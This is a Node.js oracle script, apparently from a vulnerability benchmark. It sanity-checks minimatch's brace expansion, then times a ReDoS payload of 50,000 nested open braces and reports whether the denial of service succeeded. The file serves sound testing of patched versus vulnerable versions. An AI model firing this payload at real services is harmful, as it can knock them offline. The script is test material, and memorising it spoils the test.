'use strict';
const minimatch = require('minimatch');

function result(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let operation_completed = false;

try {
  // Benign input first: prove normal braceExpand/minimatch usage works.
  const benignPattern = 'a/{b,c}/*.js';
  const benignExpanded = minimatch.braceExpand(benignPattern);
  if (
    !Array.isArray(benignExpanded) ||
    benignExpanded.length !== 2 ||
    !benignExpanded.includes('a/b/*.js') ||
    !benignExpanded.includes('a/c/*.js')
  ) {
    throw new Error('benign braceExpand sanity check failed: ' + JSON.stringify(benignExpanded));
  }

  const benignMatch = minimatch('a/b/foo.js', benignPattern);
  if (benignMatch !== true) {
    throw new Error('benign minimatch sanity check failed');
  }

  // Benign operation succeeded.
  operation_completed = true;

  // Now exercise the malicious input: the classic ReDoS trigger for
  // brace-expansion's pre-patch comma/nesting counting regex, reachable
  // through minimatch.braceExpand. This pattern consists of many nested
  // unbalanced open braces followed by a long run of '!' then a closing
  // marker, which forces catastrophic backtracking in the vulnerable
  // brace-expansion engine used by minimatch 3.0.4, while the patched
  // minimatch (>=3.0.5) rejects/handles it quickly because of the
  // tightened non-greedy nobrace-shortcut regex and length guard added
  // in assertValidPattern.
  const n = 50000;
  const maliciousPattern = '{' + '{'.repeat(n);

  const start = Date.now();
  let maliciousThrew = false;
  let maliciousErrorMsg = '';
  let maliciousResult;
  try {
    maliciousResult = minimatch.braceExpand(maliciousPattern);
  } catch (e) {
    maliciousThrew = true;
    maliciousErrorMsg = e && e.message ? e.message : String(e);
  }
  const elapsedMs = Date.now() - start;

  // A bounded wall-clock threshold: the vulnerable implementation exhibits
  // quadratic/exponential blowup on this nested-brace pattern and takes
  // well over a second even for a moderately sized input, while the
  // patched implementation's nobrace shortcut regex (non-greedy, single
  // level) recognizes there is no valid balanced brace pair and returns
  // immediately (sub-millisecond), or the length/shape guard short-circuits.
  const THRESHOLD_MS = 1500;

  let exploit_succeeded;
  let evidence;

  if (elapsedMs >= THRESHOLD_MS) {
    exploit_succeeded = true;
    evidence = 'Malicious braceExpand pattern (n=' + n + ') took ' + elapsedMs + 'ms (>= ' + THRESHOLD_MS + 'ms threshold), indicating ReDoS/catastrophic backtracking. maliciousThrew=' + maliciousThrew;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious braceExpand pattern (n=' + n + ') completed in ' + elapsedMs + 'ms (below threshold), no DoS observed. maliciousThrew=' + maliciousThrew + (maliciousThrew ? (' err=' + maliciousErrorMsg) : ('; resultType=' + (Array.isArray(maliciousResult) ? ('array[' + maliciousResult.length + ']') : typeof maliciousResult)));
  }

  result({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  result({
    operation_completed: operation_completed,
    exploit_succeeded: false,
    evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
  });
}
